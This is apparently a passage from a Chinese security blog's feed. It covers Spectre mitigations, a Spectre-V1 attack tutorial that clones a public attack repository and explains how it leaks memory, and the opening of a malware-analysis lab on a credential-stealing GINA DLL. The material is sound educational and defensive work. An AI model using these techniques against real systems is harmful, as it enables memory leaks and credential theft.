punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token comment">// 任意路径下都不会发生越界读取！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果idx&gt;ARRAY_SIZE,idx便会被强制变为0，从而杜绝掉投机执行过程中的越界操作</p><hr><h3 id="Pointer-Poisoning"><a href="#Pointer-Poisoning" class="headerlink" title="Pointer Poisoning"></a>Pointer Poisoning</h3><p>与Index Masking类似，同样是通过掩码形式，对函数指针也进行了三元式判别操作，从而保证投机执行下，不可能访问到未知的危险指针</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//--- cond为受害者进程中的某一条件判断 ---</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* dump */</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">real_impl</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* secret op */</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cond<span class="token punctuation">)</span>    func <span class="token operator">=</span> real_impl<span class="token punctuation">;</span><span class="token keyword">else</span>    func <span class="token operator">=</span> fallback<span class="token punctuation">;</span><span class="token comment">// ---- Pointer Poisoning: 用mask保护指针 ----</span><span class="token class-name">uintptr_t</span> valid_mask <span class="token operator">=</span> cond <span class="token operator">?</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span><span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 条件假时指针全零/无效</span>func <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span>func <span class="token operator">&amp;</span> valid_mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 投机执行下，func为0时不会跳到real_impl，只能默认回到NULL或trap分支</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同理，cond为false时，为避免投机执行，使用掩码将指针置为NULL，从而无法跳转到real_impl</p><hr><h3 id="Retpoline"><a href="#Retpoline" class="headerlink" title="Retpoline"></a>Retpoline</h3><p>采用巧妙的“返回跳板”来 <strong>替代所有间接jmp&#x2F;call</strong> ，防止分支目标预测被攻击者控制。</p><p>首先我们应该了解RSB这个结构，它是用于投机执行间接分支跳转的重要组件：每当call的时候，RSB和物理栈同步压入返回地址，遇到ret时，先投机执行RSB栈顶的返回；等到真实ret地址从内存中取出时与其比对，若投机错误回退，当物理栈的ret真正commit时，RSB栈才会同步pop出栈顶地址，确保RSB与物理栈的对应（投机过程中RSB不会pop元素）</p><p>替代示例：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; ------ 原始间接跳转（易受投机攻击）------; mov %r11, %rax; call *%rax; 这会用BTB做预测，容易被Spectre V2污染; ------ Retpoline替换实现 ------; 目标：安全地跳转到%r11，而不让BTB被攻击者控制; 步骤：call   set_up_trampoline          ; [1] 正常call跳入trampoline                                 ;     call自动把下一条指令的地址压入真实栈和RSB                                 ;     RSB随后为ret提供正确返回目标set_up_trampoline:    mov   %r11, (%rsp)           ; [2] 用你要跳转的目标地址覆写栈顶（call时刚刚压进去的返回地址）                                 ;     注意：只有真实commit&#x2F;execution才会“落地修改”！    ret                          ; [3] ret从栈（已经被mov改写）弹出目标 -&gt; 跳转到%r11                                 ;     commit时才pop，安全跳转                                 ;     投机期则ret永远预测跳回本函数的mov这一行（由RSB控制）    trap_loop:                       ; [4] trap loop是保险兜底，不会被常规流程执行    pause       jmp    trap_loop  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="SpecLFB"><a href="#SpecLFB" class="headerlink" title="SpecLFB"></a>SpecLFB</h3><p>核心逻辑：仅限制 “导致缓存缺失的不安全投机加载（MUSL）”，通过 LFB 安全检查阻止其修改缓存，验证安全后再刷新缓存。</p><ul><li>目标：消除由“投机加载导致的缓存写入（cache-fill）”所构成的主要 Spectre&#x2F;Transient‑Execution 缓存侧信道。即：防止任何“未被验证的（speculative&#x2F;unsafe）加载”把数据写入上层可被其它上下文观测到的缓存层（L1&#x2F;L2&#x2F;LLC），直到该加载被确认为 non‑speculative &#x2F; safe。</li><li>受保护对象（Threat）：所有可能在推测路径上读取敏感数据并通过 cache 层引起可测副作用的 load（尤其 cache‑miss 导致的 refill）。</li><li>假设&#x2F;边界：<ul><li>我们不尝试一次性阻断所有微架构泄露（如端口争用、TLB 条目、DRAM-row effects 等），但尽力把最常用且易被利用的“cache-fill”通道切断或延迟。</li><li>该方案是硬件特性，需要在 CPU 的 LFB（Line Fill Buffer &#x2F; fill buffer）与 ROB（Reorder Buffer）之间协作。</li></ul></li></ul><p>只针对会产生可观测缓存插入的“Memory-Unsafe Speculative Loads（MUSL）”，避免对所有投机加载一刀切导致大幅性能降损。</p><p>同时一旦投机被验证为“safe”（例如分支被确认、store‑load 依赖解决、值预测验证），立即允许写回以减少延迟。</p><p>具体操作为：</p><ul><li>新增&#x2F;扩展模块：<ol><li>ROB Unsafe Mask Vector（与 ROB 一一对应的位向量）：每个 ROB 条目附带一个 unsafe bit（1&#x3D;可能导致 MUSL、需延迟写回；0&#x3D;safe）。</li><li>LFB 扩展：LFB 条目包含 ROB 指针&#x2F;索引（或 ROB id）、状态位（valid、data_ready、safe_ready）以及 writeback gating 控制。</li><li>LFB → Cache 写回控制逻辑：在 refill 完成后，仅当对应 ROB unsafe bit &#x3D;&#x3D; 0（或 ROB 已 retired）时才执行 cache writeback；否则保留在 LFB。</li><li>Backpressure &#x2F; Stall Controller：当 LFB 条目达到阈值时，对 dispatch&#x2F;issue 做节流，防止资源耗尽。</li></ol></li><li>流程（简述）：<ul><li>CPU 发出 load；若 miss，则 LFB 发起 refill request 到下层（L2&#x2F;LLC&#x2F;memory）。</li><li>当 refill 返回数据，LFB 创建&#x2F;更新条目并尝试写回 L1。</li><li>写回前，LFB 查询 ROB unsafe mask：<ul><li>若 safe（bit&#x3D;&#x3D;0 或 retired），写回并完成 load；</li><li>若 unsafe（bit&#x3D;&#x3D;1），则延迟写回并保持 LFB 条目直至该 bit clear或 ROB 重命中&#x2F; retirement。</li></ul></li><li>若 ROB&#x2F;指令被 squash，LFB 丢弃对应条目。</li></ul></li></ul><p>位管理策略：</p><ol><li><p>unsafe bit &#x3D;&#x3D; 1</p><ul><li>load 的控制流未解析（依赖于一个条件&#x2F;indirect branch whose target&#x2F;direction not yet resolved）；</li><li>load 地址计算依赖于未确认的 store（store‑buffer 地址未确定或 store 在 ROB 前仍未 retired）；</li><li>加载地址&#x2F;权限来自未验证的来源（如 speculative value predictor 或从用户输入直接映射到地址）；</li><li>访问的是共享内存（可选策略，若想限制共享内存泄露更严格可一律 treat shared loads as MUSL）；</li><li>访问可能触发异常（如可能的 page fault&#x2F;permission fault）：将其视为 MUSL 直到异常处理确定（实现更保守但安全）。</li></ul></li><li><p>unsafe bit &#x3D;&#x3D; 0</p><ul><li>控制流验证：相关的 branch resolved 且 prediction &#x3D;&#x3D; actual；</li><li>store-load 依赖解析：先前的 store addresses 已经确认不是相同地址（或已 retired）；</li><li>值预测或其他 speculated sources 被证明正确；</li><li>指令到达 ROB 头并被 non‑speculatively retired（最终保证 safe，但往往是最晚时机）；</li><li>若指令被 squash（mis-speculation），直接丢弃并无需清位（ROB entry 被回收）。</li></ul></li></ol><hr><h3 id="Citadel"><a href="#Citadel" class="headerlink" title="Citadel"></a>Citadel</h3><h4 id="微架构隔离"><a href="#微架构隔离" class="headerlink" title="微架构隔离"></a>微架构隔离</h4><h5 id="1-内存隔离：区分私有-共享内存，避免地址混淆原理"><a href="#1-内存隔离：区分私有-共享内存，避免地址混淆原理" class="headerlink" title="1.内存隔离：区分私有 &#x2F; 共享内存，避免地址混淆原理"></a>1.内存隔离：区分私有 &#x2F; 共享内存，避免地址混淆原理</h5><p>攻击者利用共享内存地址别名或权限混淆，构造 “通用读取 gadget” 泄露私有数据。通过严格划分内存权限和地址空间，确保私有内存仅 enclave 可访问，共享内存地址独立，阻断地址层面的攻击路径。</p><h6 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h6><ul><li><strong>物理内存分区</strong> ：将物理内存划分为 64 个 32MB 固定区域，由安全监控器（SM）分配给不同安全域（enclave、OS、SM），核心通过内存位图寄存器存储访问权限，所有内存访问（含投机和页表遍历）均需经过权限校验。</li><li><strong>双页表机制</strong> ：</li><li>私有页表：enclave 私有内存使用独立页表，存储在 enclave 私有内存中，仅 enclave 可访问；</li><li>共享页表：共享内存使用单独页表，存储在共享内存中，OS 和 enclave 均有权限；</li><li>地址区分：通过两个专用寄存器定义 enclave 私有虚拟内存范围，仅需虚拟地址即可判断内存类型，无需投机翻译物理地址（避免泄露）。</li><li><strong>跨域访问控制</strong> ：地址翻译时额外校验，确保访问地址与当前安全域匹配（私有内存仅 enclave 访问，共享内存需符合权限）。</li></ul><h6 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>enclave 与 OS 共享内存通信（如 I&#x2F;O、消息传递）时，避免 OS 通过地址混淆访问 enclave 私有内存；</li><li>私有共享内存场景（如多个 enclave 间通信），确保 OS 无法窥探。</li></ul><h5 id="2-共享组件隔离：阻断共享微架构的侧信道"><a href="#2-共享组件隔离：阻断共享微架构的侧信道" class="headerlink" title="2. 共享组件隔离：阻断共享微架构的侧信道"></a>2. 共享组件隔离：阻断共享微架构的侧信道</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>现代 CPU 共享组件（LLC、TLB、L1 缓存）是侧信道攻击的关键载体（如 LLC 缓存攻击、TLB 别名攻击）。通过对共享组件分区、 tagging 或旁路，避免跨安全域的状态泄露。</p><h6 id="实现细节-1"><a href="#实现细节-1" class="headerlink" title="实现细节"></a>实现细节</h6><table><thead><tr><th>共享组件</th><th>防护机制</th><th>原理</th><th>实现</th></tr></thead><tbody><tr><td>LLC（末级缓存）</td><td>动态分区 + 细粒度刷新</td><td>避免不同安全域的缓存行竞争，防止通过缓存状态泄露</td><td>1. 按内存区域动态划分 LLC，SM 可配置每个区域的缓存切片大小；2. 新增 “Zero Device” 逻辑，支持按需刷新指定 LLC 切片（仅需访问对应地址的驱逐集）；3. 缓存访问时按物理内存区域 ID 映射到对应切片。</td></tr><tr><td>TLB&#x2F;ATC（地址翻译缓存）</td><td>标签隔离</td><td>防止跨域地址别名导致的翻译状态泄露</td><td>为 TLB&#x2F;ATC 条目添加 “私有 &#x2F; 共享内存” 标签，翻译时仅匹配同标签条目，避免混淆。</td></tr><tr><td>L1-D 缓存</td><td>旁路机制</td><td>避免 enclave 私有 L1 状态通过缓存一致性协议泄露</td><td>enclave 访问共享内存时，直接绕过 L1-D 缓存，数据从 LLC 直接加载 &#x2F; 存储，减少 L1 状态暴露。</td></tr><tr><td>MSHR（缺失状态保持寄存器）</td><td>静态分区</td><td>防止跨核 MSHR 竞争导致的泄露</td><td>为不同核心静态分配 MSHR 资源，避免一个核心的请求影响另一个核心的 MSHR 状态。</td></tr></tbody></table><h6 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>LLC 分区：适用于 enclave 和 OS 同时运行、需频繁访问共享内存的场景（如私有 ML 推理中加载共享模型权重）；</li><li>L1-D 旁路：适用于共享内存访问无 temporal 复用的场景（如一次性数据传输），避免 L1 状态泄露；</li><li>TLB tagging：适用于大页内存场景，防止跨域地址别名攻击。</li></ul><h5 id="3-上下文切换清理：清除状态残留"><a href="#3-上下文切换清理：清除状态残留" class="headerlink" title="3. 上下文切换清理：清除状态残留"></a>3. 上下文切换清理：清除状态残留</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>安全域切换（如 OS→enclave、enclave→OS）时，微架构状态（L1 缓存、TLB、分支预测器）可能残留前一域的执行痕迹，成为侧信道。通过切换时强制清理，阻断状态残留泄露。</p><h6 id="实现细节-2"><a href="#实现细节-2" class="headerlink" title="实现细节"></a>实现细节</h6><ul><li><strong>触发时机</strong> ：由 SM 介入所有安全域切换（如 enclave 创建 &#x2F; 销毁、OS 调用 enclave）；</li><li><strong>清理范围</strong> ：L1 缓存、TLB、ATC、MSHR、分支预测器（BTB&#x2F;BHT&#x2F;RAS）；</li><li><strong>优化策略</strong> ：放松清理政策 ——enclave 与 mini-SM（enclave 私有 SM 副本）切换时不清理（二者无秘密隔离需求），仅跨安全域（如 enclave→OS）时全量清理。</li></ul><h6 id="应用场景-2"><a href="#应用场景-2" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>enclave 与 OS 频繁切换的场景（如加密库处理多个 OS 请求）；</li><li>多 enclave 共享核心的场景，避免 enclave 间状态残留泄露。</li></ul><h4 id="受控投机执行"><a href="#受控投机执行" class="headerlink" title="受控投机执行"></a>受控投机执行</h4><p>通过两种执行模式，在 “安全” 和 “性能” 间平衡，确保投机执行不额外泄露秘密（符合 RMI 属性）。</p><h5 id="1-Safe-Mode（默认模式：无代码分析，普适安全）"><a href="#1-Safe-Mode（默认模式：无代码分析，普适安全）" class="headerlink" title="1.Safe Mode（默认模式：无代码分析，普适安全）"></a>1.Safe Mode（默认模式：无代码分析，普适安全）</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>攻击者利用投机执行访问共享内存，修改共享微架构状态（如 LLC 缓存）泄露秘密。Safe Mode 禁止 “投机访问共享内存”，仅允许非投机状态（指令到达 ROB 头部）的共享内存访问，从根源阻断投机泄露。</p><h6 id="实现细节-3"><a href="#实现细节-3" class="headerlink" title="实现细节"></a>实现细节</h6><ul><li><strong>判断逻辑</strong> ：内存执行流水线早期校验 —— 若访问共享内存且处于投机状态（未到达 ROB 头部），则判定为 “不安全”；</li><li><strong>处理流程</strong> ：<ul><li>不安全访问被 squash（撤销执行），并向内存保留站（MemRS）发送 “重新调度” 信号；</li><li>待指令到达 ROB 头部（非投机状态），MemRS 重新调度该访问，执行共享内存操作；</li></ul></li><li><strong>关键优化</strong> ：仅限制共享内存的投机访问，私有内存的投机执行不受影响（降低性能开销）。</li></ul><h6 id="应用场景-3"><a href="#应用场景-3" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>无需高性能、代码片段复杂（难以分析）的场景，如 Python 运行时的通用代码、加密库中的非热点路径；</li><li>作为默认模式，覆盖所有未启用 Burst Mode 的代码，确保基础安全性。</li></ul><h5 id="2-Burst-Mode（性能优化模式：需静态代码分析）"><a href="#2-Burst-Mode（性能优化模式：需静态代码分析）" class="headerlink" title="2. Burst Mode（性能优化模式：需静态代码分析）"></a>2. Burst Mode（性能优化模式：需静态代码分析）</h5><h6 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h6><p>Safe Mode 对共享内存访问的延迟会影响性能（如 memcpy、批量数据传输）。Burst Mode 允许 “有限投机访问共享内存”，但通过 “直线投机 + 静态代码分析” 确保投机路径不泄露秘密。</p><h6 id="实现细节-4"><a href="#实现细节-4" class="headerlink" title="实现细节"></a>实现细节</h6><p>（1）硬件层面：限制投机类型</p><ul><li>禁用复杂分支预测器：关闭 BTB（分支目标缓冲区）、BHT（分支历史表）、RAS（返回地址栈）；</li><li>强制直线投机：仅预测 “pc+4”（顺序执行），无间接分支或跳转预测，避免攻击者操控预测目标；</li><li>投机屏障：通过 CSR 寄存器写入启用 Burst Mode，该写入指令同时作为投机屏障，隔离前后代码的投机状态。</li></ul><p>（2）软件层面：静态代码分析（工具 sta）</p><ul><li>分析目标：代码片段需满足两个条件：<ul><li>自包含性：控制流限于代码片段内，无间接分支，所有分支目标均在片段内；</li><li>无秘密泄露：投机路径中访问的共享内存地址不依赖秘密数据（通过反向依赖分析验证，标记 “泄露寄存器”，确保其不关联秘密）；</li></ul></li><li>工具输出：通过分析的代码片段可启用 Burst Mode，未通过的仍使用 Safe Mode。</li></ul><h6 id="应用场景-4"><a href="#应用场景-4" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>高性能需求的代码片段，如 memcpy（顺序共享内存访问）、ML 推理中的批量数据拷贝、加密库中的输入数据预处理；</li><li>代码片段短小、逻辑简单（易通过静态分析）的场景，避免性能开销。</li></ul><h4 id="软件基础设施支撑（核心目标：保障防护机制落地）"><a href="#软件基础设施支撑（核心目标：保障防护机制落地）" class="headerlink" title="软件基础设施支撑（核心目标：保障防护机制落地）"></a>软件基础设施支撑（核心目标：保障防护机制落地）</h4><h5 id="1-安全监控器（SM）-迷你-SM（Mini-SM）"><a href="#1-安全监控器（SM）-迷你-SM（Mini-SM）" class="headerlink" title="1. 安全监控器（SM）+ 迷你 SM（Mini-SM）"></a>1. 安全监控器（SM）+ 迷你 SM（Mini-SM）</h5><h6 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h6><p>SM 是可信根（TCB 核心），负责管理安全域、权限控制和防护机制触发；Mini-SM 避免 SM 成为共享资源泄露点。</p><h6 id="实现细节-5"><a href="#实现细节-5" class="headerlink" title="实现细节"></a>实现细节</h6><ul><li><strong>SM 功能</strong> ：</li></ul><ol><li>内存区域分配与权限管理（物理内存分区、双页表配置）；</li><li>安全域切换触发（微架构状态清理）；</li><li>enclave 生命周期管理（创建、销毁、线程分配）；</li></ol><ul><li><strong>Mini-SM 功能</strong> ：每个 enclave 私有副本，仅包含 enclave 所需的 SM API 子集，存储在 enclave 私有内存，避免 enclave 调用 SM 时泄露 timing 信息。</li></ul><h6 id="应用场景-5"><a href="#应用场景-5" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>所有 enclave 相关操作的权限校验（如内存访问授权、enclave 启动）；</li><li>跨安全域交互的中介（如 enclave 与 OS 的共享内存权限配置）。</li></ul><h5 id="2-远程证明机制"><a href="#2-远程证明机制" class="headerlink" title="2. 远程证明机制"></a>2. 远程证明机制</h5><h6 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h6><p>确保 enclave 的完整性（未被篡改），避免攻击者通过篡改 enclave 代码绕过防护机制。</p><h6 id="实现细节-6"><a href="#实现细节-6" class="headerlink" title="实现细节"></a>实现细节</h6><ul><li><strong>测量内容</strong> ：enclave 的初始状态（二进制代码、虚拟内存映射、Mini-SM 代码、线程配置）；</li><li><strong>密钥推导</strong> ：SM 基于测量结果推导 enclave 的 Ed25519 密钥对，确保相同 enclave 在相同设备上的密钥一致性；</li><li><strong>证明流程</strong> ：SM 为 enclave 生成 attestation 证书（包含测量结果和公钥），远程用户通过验证证书确认 enclave 完整性，再通过公钥建立安全通信。</li></ul><h6 id="应用场景-6"><a href="#应用场景-6" class="headerlink" title="应用场景"></a>应用场景</h6><ul><li>跨网络的 enclave 交互（如云端私有 ML 推理服务），用户验证服务端 enclave 未被篡改；</li><li>敏感数据传输前的身份校验（如加密库接收客户端数据前，客户端验证 enclave 合法性）。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 硬件攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spectre </tag>
            
            <tag> 侧信道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spectre-v1</title>
      <link href="/2025/12/02/spectre-v1/"/>
      <url>/2025/12/02/spectre-v1/</url>
      
        <content type="html"><![CDATA[<h3 id="Spectre-V1简介"><a href="#Spectre-V1简介" class="headerlink" title="Spectre-V1简介"></a>Spectre-V1简介</h3><p>Spectre-V1是Spectre(幽灵)漏洞攻击的一个变种，是一种针对处理器硬件分支预测特性的攻击方法：它主要利用分支预测对硬件cache有着不回退的影响这一点来进行常规的侧信道攻击</p><p><img src="/2025/12/02/spectre-v1/1764689207794.png" alt="常见流水线CPU结构"></p><p>首先我们要明白，分支预测为何会对数据cache产生影响。在流水线CPU中，为了加速CPU执行速度，常常会进行分支预测。如果一个条件判断多次正确，那么CPU将会在下一次读取相同指令时先默认该条件判断为真，对指令进行译码，读取数据等操作。而真正的数据计算则是会在EX阶段进行，如果条件错误，CPU将在此时flush后续指令，避免错误指令执行。但我们的数据读取是在EX阶段所执行的，而又众所周知，读取数据将会在cache中留下痕迹。此时虽然我们的错误指令并未真正执行，但cache中其实已经写入了我们想要得到的数据</p><p><img src="/2025/12/02/spectre-v1/1764689432405.png" alt="常见攻击片段"></p><p>正如上图所示，当我们多次给出正确的X值时，CPU将会默认该条件成立。那么此时，我们使用攻击地址和array1数组的相对偏移作为index，则攻击地址的内容将会被逐字节逐次写入到cache中。</p><p>比如此时array1[x]&#x3D;’H’,ASCII码值为72,那么array2[72*4096]将会被加载到cache中去，后续我们再读取array2[72*4096]中的数据就会远远快于其他数据，我们便可以通过这个时间差异进行侧信道攻击</p><h3 id="系统检测"><a href="#系统检测" class="headerlink" title="系统检测"></a>系统检测</h3><p>使用开源工具，来检查Ubuntun虚拟机是否支持Spectre-V1变体的攻击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/speed47/spectre-meltdown-checker.git<span class="token builtin class-name">cd</span>  spectre-meltdown-checker<span class="token function">sudo</span> ./spectre-meltdown-checker.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2025/12/02/spectre-v1/1764691329626.png"></p><p>可以发现有很多缓解措施都是没有使用的，那么我们的V1攻击应该可以执行</p><p>接下来我们给出一个Spectre-V1攻击的示例仓库源码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Eugnis/spectre-attack.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>笔者将逐步解析该段攻击代码</p><h3 id="Victim"><a href="#Victim" class="headerlink" title="Victim"></a>Victim</h3><p>Victim段的代码诸如上述所言，首先定义了攻击所需的array1和array2数组，并且为了防止两个数组中的数据落在同一cache缓存行中（如果array1中有部分数据与array2缓存行重叠，那么在使用array1攻击的同时，会将我们所不愿意加载的array2的cache line加载进cache，使得每次攻击无法精准判断对应的字符），在数组中间定义了unused数组用于占位；</p><p>其中unused数组大小和array2数组中的512依据设备具体的cache line大小确定，为一单位cache line 大小</p><p>接下来使用经典的漏洞结构，便于我们后续向cache中注入指定数据</p><p><img src="/2025/12/02/spectre-v1/1764691666289.png"></p><h3 id="Initiate"><a href="#Initiate" class="headerlink" title="Initiate"></a>Initiate</h3><p>为了便于学习具体攻击方法，我们首先浏览一下main函数中初始化的变量</p><p>可以发现 默认攻击模式下 <code>malicious_x</code>正是攻击地址与array1的相对偏移值，而指定参数模式下，则是可以选定具体的地址进行攻击</p><p>记住 <code>malicious_x</code>是相对偏移，<code>len</code>则是攻击的长度</p><p><img src="/2025/12/02/spectre-v1/1764692286616.png"></p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>攻击代码部分首先定义了 <code>CACHE_HIT_THRESHOLD</code>用于判断数据是否在cache中</p><p>其次对我们存储cache命中次数的results数组进行初始化。接下来进行999次攻击尝试，攻击具体细节如下：</p><p>首先将cache中所有array2的缓存行清除，根据尝试次数来决定此次的training_x索引。重要的是接下来的循环：清空array1缓存，通过数学变换而非条件判断完成任务：每五轮正确预测后追加一轮攻击</p><p><img src="/2025/12/02/spectre-v1/1764692496166.png"></p><p>后续，遍历array2的所有cache line，并使用混淆方式乱序读取，防止编译器自行优化（167与255互质，可以遍历），如果时间小于我们设置的阈值，并且不处于正常情况下的array2前16个cache line，我们就将当前cache line的命中次数加1</p><p><img src="/2025/12/02/spectre-v1/1764693167576.png"></p><p>后续我们选出命中次数最多的前两行，并且可以设置剪枝条件，防止运行时间过久</p><p><img src="/2025/12/02/spectre-v1/1764693373690.png"></p><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p>我们得到了最大行和次大行，根据此时数值来确定字符</p><p>while循环用于攻击指定长度的片段，通过攻击函数得到的value是行数，也就是字符的ASCII码值，score是字符对应行的命中次数。最终将窃取数据存在decode中</p><p><img src="/2025/12/02/spectre-v1/1764693531868.png"></p><h3 id="Show"><a href="#Show" class="headerlink" title="Show"></a>Show</h3><p>在此运行演示代码，Ubuntun虚拟机，成功获取目标字符串</p><p><img src="/2025/12/02/spectre-v1/1764693728158.png"></p><p>Windows主机，获取目标字符串的大量信息</p><p><img src="/2025/12/02/spectre-v1/1764693808355.png"></p><p>由此可见该攻击方式的普适性</p>]]></content>
      
      
      <categories>
          
          <category> 硬件攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spectre </tag>
            
            <tag> 侧信道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab11</title>
      <link href="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/"/>
      <url>/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/</url>
      
        <content type="html"><![CDATA[<h3 id="Lab11-01"><a href="#Lab11-01" class="headerlink" title="Lab11-01"></a>Lab11-01</h3><p>首先给出这次的几个问题</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764382637170.png"></p><p>依然，我们使用strings先对文件进行初步的分析，可以得到以下结果：</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764382815900.png"></p><p>很显然，该恶意程序进行了一系列的资源操作，那么我们接下来应该使用Resource Hacker对他的资源节进行分析</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764383018671.png"></p><p>显而易见，该程序的资源节中藏着一个PE文件，我们应该将这个PE文件提取出来，并且使用PEID查看它的文件类型</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764383272959.png"></p><p>可以看到该文件为一个DLL文件，我们再对他进行strings分析。发现有gina.dll和一系列的WLX前缀函数，可以推测程序功能为恶意gina拦截</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764383394424.png"></p><p>接下来我们进行初步的动态分析，使用Process Monitor监视恶意程序操作</p><p>观察发现，程序为注册表创建了键值对，并且向当前目录中写入了一份msgina32.dll，该dll即是我们之前提取出来的资源</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764383724947.png"></p><p>因此，问题1：程序向电脑释放了一个伪装的ginaDLL；</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764384105773.png"></p><p>问题2：程序通过注册表键值设置，来确保对应操作时首先调用伪造的msgina32.dll，从而实现长久化驻留</p><p>接下来我们使用IDA工具对恶意代码进行分析，首先分析exe程序，大体观察一下，发现其功能就是我们刚才所分析的</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764385909817.png"></p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764385914598.png"></p><p>因此，猜测该恶意程序主要功能集成在dll中，对dll进行分析，可以看到DLLMain中先动态的加载真实的MSGina.dll到全局变量 <code>hLibModule</code>中，便于后续的调用。</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764386232623.png"></p><p>既然是Gina拦截程序，那么必然会实现Gina原有的所有功能，我们可以查看导出表验证这一点</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764386487735.png"></p><p>接下来我们深入查看，分析该Dll文件在Gina操作的基础上插入了怎样的恶意代码，任选一个函数观察</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764386661904.png"></p><p>发现其实现通过调用子函数，再跳转到返回值的对应处进行后续操作，那么我们猜测，该子函数的作用便是将Gina中的原本的对应函数实现地址赋值给eax,深入分析子函数</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764386938303.png"></p><p>发现确实如此，通过传入的参数不同，选择调用不同的库函数，并且返回对应地址。但是这样的操作并没有恶意代码的执行啊？那么我们遍历一遍所有导出函数的具体实现，发现函数 <code>WlxLoggedOutSAS</code>的实现与别的函数都有所差别</p><p>那么我们猜测WlxLoggedOutSAS便是恶意函数，深入分析</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764387295792.png"></p><p>发现格式化字符串的调用，那么此处的子函数应该就是具体的打印函数,我们进入到子函数内部</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764387422197.png"></p><p>可以看到，一些有用的信息被写入到了msutil32.sys这个伪装的系统文件中，并且我们知道，logout函数的触发条件，同时虚拟机已经被该程序污染过。因此重启虚拟机，观察该文件中写入了哪些信息</p><p><img 